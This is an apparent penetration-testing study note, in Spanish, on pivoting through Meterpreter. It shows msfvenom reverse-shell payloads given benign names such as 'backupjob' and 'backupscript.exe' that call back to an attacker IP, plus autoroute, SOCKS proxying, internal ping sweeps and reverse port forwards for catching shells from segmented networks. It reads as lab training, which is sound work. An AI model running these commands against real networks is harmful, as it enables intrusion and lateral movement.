# Meterpreter port forwarding

## Tunneling y Pivoting con Meterpreter

Meterpreter ofrece capacidades de pivoting integradas sin depender de SSH. Una vez establecida una sesión en un pivot host, se puede crear un proxy SOCKS y añadir rutas para alcanzar redes internas, o hacer port forwarding directo a servicios específicos.

### Flujo general

```
Atacante → Meterpreter session → PivotHost → red_interna
```

### Obtener sesión Meterpreter en el pivot host

```bash
# Generar payload para Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.18 LPORT=8080 \
  -f elf -o backupjob

# Listener en Metasploit
msf6> use exploit/multi/handler
msf6> set payload linux/x64/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 8080
msf6> run

# Ejecutar en el pivot host
chmod +x backupjob && ./backupjob
```

### Reconocimiento desde Meterpreter

Una vez en la sesión, antes de configurar el pivoting conviene mapear la red interna:

```bash
# Ping sweep via módulo Meterpreter
meterpreter> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# Ping sweep manual desde el pivot (Linux)
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Ping sweep (Windows CMD)
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Ping sweep (PowerShell)
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

### AutoRoute — añadir rutas a redes internas

AutoRoute añade rutas a la tabla de enrutamiento de Metasploit para que el tráfico hacia la red interna se envíe a través de la sesión Meterpreter.

```bash
# Desde la sesión Meterpreter — subred específica
meterpreter> run autoroute -s 172.16.5.0/23

# Listar rutas activas
meterpreter> run autoroute -p

# Alternativa desde msfconsole — detecta subredes automáticamente
# desde la tabla de rutas del pivot host
msf6> use post/multi/manage/autoroute
msf6> set SESSION 1
msf6> set SUBNET 172.16.5.0
msf6> run
```

El módulo `post/multi/manage/autoroute` busca automáticamente las subredes accesibles desde el pivot host leyendo su tabla de rutas — no hace falta especificar la subred si se deja vacía:

```
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
```

Salida de `autoroute -p`:

```
Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.5.0         255.255.254.0      Session 1
```

### Proxy SOCKS via Metasploit

Con las rutas configuradas, levantar un proxy SOCKS para usar herramientas externas como Nmap o xfreerdp a través de la sesión:

```bash
msf6> use auxiliary/server/socks_proxy
msf6> set SRVHOST 0.0.0.0
msf6> set SRVPORT 9050
msf6> set VERSION 4a    # o 5
msf6> run

# Verificar que está activo
msf6> jobs
```

Configurar proxychains:

```bash
# /etc/proxychains.conf — última línea
socks4  127.0.0.1 9050
```

Usar herramientas externas a través del proxy:

```bash
# Descubrimiento de hosts vivos
proxychains nmap -v -sn 172.16.5.1-200

# Escaneo de puertos — siempre -sT y -Pn con proxychains
proxychains nmap -v -Pn -sT 172.16.5.19
proxychains nmap -v -Pn -sT -p3389,445,80,443 172.16.5.19

# RDP a través del proxy
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

Metasploit puede alcanzar la red interna directamente sin proxychains si las rutas están configuradas con autoroute:

```bash
# rdp_scanner usando la ruta de autoroute — sin proxychains
msf6> use auxiliary/scanner/rdp/rdp_scanner
msf6> set RHOSTS 172.16.5.19
msf6> run
# [*] 172.16.5.19:3389 - Detected RDP (name:DC01) (os_version:10.0.17763) (Requires NLA: No)
```

> ⚠️ **Atención:** Con proxychains solo funciona TCP connect scan completo (`-sT`) con `-Pn`. Los escaneos SYN, UDP y paquetes parciales no funcionan. Firewall de Windows bloquea ICMP por defecto — usar siempre `-Pn`.

### Port Forwarding con portfwd

`portfwd` dentro de Meterpreter crea relés TCP directos sin necesidad de proxychains. Es más rápido que SOCKS para acceder a un servicio específico.

```
meterpreter> help portfwd

OPTIONS:
    -l <opt>  Forward: puerto local donde escuchar. Reverse: puerto local al que conectar.
    -L <opt>  Forward: host local donde escuchar (opcional). Reverse: host local al que conectar.
    -p <opt>  Forward: puerto remoto al que conectar. Reverse: puerto remoto donde escuchar.
    -r <opt>  Forward: host remoto al que conectar.
    -R        Indica reverse port forward.
```

```bash
# Forward: Atacante:3300 → pivot → 172.16.5.19:3389
meterpreter> portfwd add -l 3300 -p 3389 -r 172.16.5.19
# [*] Local TCP relay created: :3300 <-> 172.16.5.19:3389

# Listar reenvíos activos
meterpreter> portfwd list

# Eliminar un reenvío por índice
meterpreter> portfwd delete -i 0

# Eliminar todos
meterpreter> portfwd flush

# Conectar al servicio como si fuera local
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

Verificar con netstat desde el atacante:

```bash
netstat -antp | grep 3300
# tcp  0  0 127.0.0.1:54652  127.0.0.1:3300  ESTABLISHED  4075/xfreerdp
```

#### Reverse port forward con portfwd

Para recibir reverse shells de redes que no tienen salida directa al atacante:

```bash
# pivot escucha en 1234, reenvía todo al atacante:8081
meterpreter> portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
# [*] Local TCP relay created: 10.10.14.18:8081 <-> :1234

# Background de la sesión y configurar listener
meterpreter> bg
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 8081
msf6> run

# Payload para el objetivo Windows — apunta al pivot
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=172.16.5.129 LPORT=1234 \
  -f exe -o backupscript.exe
```

### Flujo completo — reverse shell desde red segmentada via Meterpreter

```
Objetivo Windows (172.16.5.19) → callback → PivotHost:1234 
    → portfwd → Atacante:8081 → Meterpreter session 2
```

```bash
# 1. Tener sesión Meterpreter en el pivot
# 2. Configurar autoroute
meterpreter> run autoroute -s 172.16.5.0/23

# 3. Configurar reverse port forward
meterpreter> portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# 4. Background de la sesión
meterpreter> bg

# 5. Listener para el Windows
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 0.0.0.0
msf6> set LPORT 8081
msf6> run

# 6. Generar y ejecutar payload en Windows
# El callback llega a pivot:1234 → atacante:8081
```

### Verificación con netstat

```bash
# Desde el atacante — ver conexiones establecidas
netstat -antp | grep ESTABLISHED

# Confirmar que el portfwd está activo
netstat -antp | grep <puerto_local>
```

### Comparativa SSH vs Meterpreter para pivoting

| Técnica                 | Ventaja                              | Inconveniente                      |
| ----------------------- | ------------------------------------ | ---------------------------------- |
| SSH `-D` + proxychains  | No requiere payload en pivot         | Requiere SSH activo y credenciales |
| SSH `-L` local forward  | Simple para un servicio específico   | Un túnel por servicio              |
| SSH `-R` remote forward | Útil sin conectividad directa        | Requiere SSH bidireccional         |
| Meterpreter + autoroute | Integrado en Metasploit, sin SSH     | Requiere sesión Meterpreter activa |
| Meterpreter portfwd     | Port forward directo sin proxychains | Solo TCP, un reenvío por regla     |
